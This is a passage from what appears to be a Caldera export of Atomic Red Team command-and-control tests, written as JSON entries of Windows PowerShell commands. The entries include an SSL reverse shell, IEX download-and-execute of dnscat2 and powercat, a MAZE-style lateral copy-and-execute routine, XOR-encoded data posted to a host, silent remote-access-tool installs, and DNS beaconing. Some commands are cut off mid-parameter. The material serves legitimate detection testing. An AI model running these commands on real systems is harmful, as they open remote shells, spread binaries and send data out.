                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b0e28215c59037cc6cdb61b38615c32d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b0e28215c59037cc6cdb61b38615c32d"
    },
    "T1071.004__command-and-control__Application Layer Protocol: DNS__ce2eccff2f1de0096efa0da778a7e27c": {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ce2eccff2f1de0096efa0da778a7e27c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ce2eccff2f1de0096efa0da778a7e27c"
    },
    "T1219__command-and-control__Remote Access Software__d21a964d09837abede8966daf6ae46cf": {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue",
                    "command": "Start-Process -Wait -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru; Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d21a964d09837abede8966daf6ae46cf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d21a964d09837abede8966daf6ae46cf"
    },
    "T1219__command-and-control__Remote Access Software__f50ec080343f1bec4e739dd20675c349": {
        "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'; if(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Remove-Item $file1 -ErrorAction Ignore | Out-Null",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Start-Process -Wait $file1 /S; Start-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f50ec080343f1bec4e739dd20675c349",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f50ec080343f1bec4e739dd20675c349"
    },
    "T1572__command-and-control__Protocol Tunneling__69b202bf0bb7b4ff43d4abb8867c1784": {
        "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "for($i=0; $i -le",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "69b202bf0bb7b4ff43d4abb8867c1784",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "69b202bf0bb7b4ff43d4abb8867c1784"
    },
    "T1219__command-and-control__Remote Access Software__9e1358e1b78af4bf86bab2334485a015": {
        "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9e1358e1b78af4bf86bab2334485a015",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9e1358e1b78af4bf86bab2334485a015"
    },
    "T1090.003__command-and-control__Proxy: Multi-hop Proxy__2f4c11504a21b8771b725a3e469fd74b": {
        "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.003",
            "name": "Proxy: Multi-hop Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe\"}'; sleep -s 60; stop-process -name \"tor\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2f4c11504a21b8771b725a3e469fd74b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2f4c11504a21b8771b725a3e469fd74b"
    },
    "T1105__command-and-control__Ingress Tool Transfer__2ed8948f1c1156af47d50379e7965d90": {
        "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore",
                    "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2ed8948f1c1156af47d50379e7965d90",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2ed8948f1c1156af47d50379e7965d90"
    },
    "T1219__command-and-control__Remote Access Software__396dae93ab07f7c93853def404fefebf": {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"client32\" -force -erroraction silentlycontinue",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe\" -ArgumentList \"/S /v/qn\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "396dae93ab07f7c93853def404fefebf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "396dae93ab07f7c93853def404fefebf"
    },
    "T1572__command-and-control__Protocol Tunneling__6e214f0f17e5d4988aa1085ad4291f46": {
        "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6e214f0f17e5d4988aa1085ad4291f46",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6e214f0f17e5d4988aa1085ad4291f46"
    },
    "T1095__command-and-control__Non-Application Layer Protocol__4640e7df3aa2f0bc88f4c0ad5a215c83": {
        "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cmd /c \"#{ncat_exe}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4640e7df3aa2f0bc88f4c0ad5a215c83",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4640e7df3aa2f0bc88f4c0ad5a215c83"
    },
    "T1071.004__command-and-control__Application Layer Protocol: DNS__bda00f459bb9118c4c88de426055e180": {
        "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bda00f459bb9118c4c88de426055e180",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bda00f459bb9118c4c88de426055e180"
    },
    "T1105__command-and-control__Ingress Tool Transfer__3b4fb2e38c41453a6b2b0f2fecdd84ff": {
        "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") ; {foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"); {wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null; Remove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}; Remove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue; Remove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue",
                    "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"; $offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"; $completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"; foreach ($machine in get-content -path \"$machine_list\"); {if (test-connection -Count 1 -computername $machine -quiet) ; {cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"; echo $machine >> \"$completed_list\"; wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}; else; {echo $machine >> \"$offline_list\"}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b4fb2e38c41453a6b2b0f2fecdd84ff",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3b4fb2e38c41453a6b2b0f2fecdd84ff"
    },
    "T1219__command-and-control__Remote Access Software__1ce0e92b4cd09129c6d0f3aafb38c600": {
        "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"Connect\" -force -erroraction silentlycontinue",
                    "command": "Start-Process $env:ProgramFiles\\Connect\\Connect.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ce0e92b4cd09129c6d0f3aafb38c600",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1ce0e92b4cd09129c6d0f3aafb38c600"
    },
    "T1090.001__command-and-control__Proxy: Internal Proxy__b0eb5108debf92ed5707a964b2bf3481": {
        "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.001",
            "name": "Proxy: Internal Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null",
                    "command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b0eb5108debf92ed5707a964b2bf3481",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b0eb5108debf92ed5707a964b2bf3481"
    },
    "T1105__command-and-control__Ingress Tool Transfer__a88b5c13a1d5d6bdf02b66bc73411f41": {
        "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\Atomic-license.txt -Force -ErrorAction Ignore",
                    "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a88b5c13a1d5d6bdf02b66bc73411f41",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a88b5c13a1d5d6bdf02b66bc73411f41"
    },
    "T1132.001__command-and-control__Data Encoding: Standard Encoding__5fd6b6b635191898a202dc7c21aa6068": {
        "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1132.001",
            "name": "Data Encoding: Standard Encoding"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\")); $key = \"abcdefghijklmnopqrstuvwxyz123456\"; $cyphertext =  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5fd6b6b635191898a202dc7c21aa6068",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5fd6b6b635191898a202dc7c21aa6068"
    },
    "T1219__command-and-control__Remote Access Software__b6ebae300e5ff115e965cc9179d4f831": {
        "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try{\"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1\"} catch{}",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"; $file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"; Start-Process $file1 /S; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b6ebae300e5ff115e965cc9179d4f831",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b6ebae300e5ff115e965cc9179d4f831"
    },
    "T1090.003__command-and-control__Proxy: Multi-hop Proxy__f21623deb932dc0db3f00068ba15bf32": {
        "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.003",
            "name": "Proxy: Multi-hop Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore; if($null -ne $Proxy) ; {Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}",
                    "command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f21623deb932dc0db3f00068ba15bf32",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f21623deb932dc0db3f00068ba15bf32"
    },
    "T1071.004__command-and-control__Application Layer Protocol: DNS__08faa1ff79f2c8e48a2869a830c210f7": {
        "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "08faa1ff79f2c8e48a2869a830c210f7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "08faa1ff79f2c8e48a2869a830c210f7"
    },
    "T1095__command-and-control__Non-Application Layer Protocol__981cf81e3bb0649fafc31217c8cbc00d": {
        "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); powercat -c",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "981cf81e3bb0649fafc31217c8cbc00d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "981cf81e3bb0649fafc31217c8cbc00d"
    },
    "T1573__command-and-control__Encrypted Channel__fb827394b296192cb7a81031a2e37ae2": {
        "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1573",
            "name": "Encrypted Channel"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fb827394b296192cb7a81031a2e37ae2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fb827394b296192cb7a81031a2e37ae2"
    },
    "T1571__command-and-control__Non-Standard Port__7f734143338de2b02093a703f919e7fc": {
        "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1571",
            "name": "Non-Standard Port"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Test-NetConnection -ComputerName google.com -port 8081",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7f734143338de2b02093a703f919e7fc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7f734143338de2b02093a703f919e7fc"
    },
    "T1071.004__command-and-control__Application Layer Protocol: DNS__0fccd1bb314f0b3cbffd27c2123ae955": {
        "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\" -QuickTimeout}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0fccd1bb314f0b3cbffd27c2123ae955",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0fccd1bb314f0b3cbffd27c2123ae955"
    },
    "T1219__command-and-control__Remote Access Software__820a346b2b676b51338c1170b675f76b": {
        "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue",
                    "command": "Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "820a346b2b676b51338c1170b675f76b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "820a346b2b676b51338c1170b675f76b"
    },
    "T1219__command-and-control__Remote Access Software__aada5380e7d0a4c7b71f2a324d9d5327": {
        "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
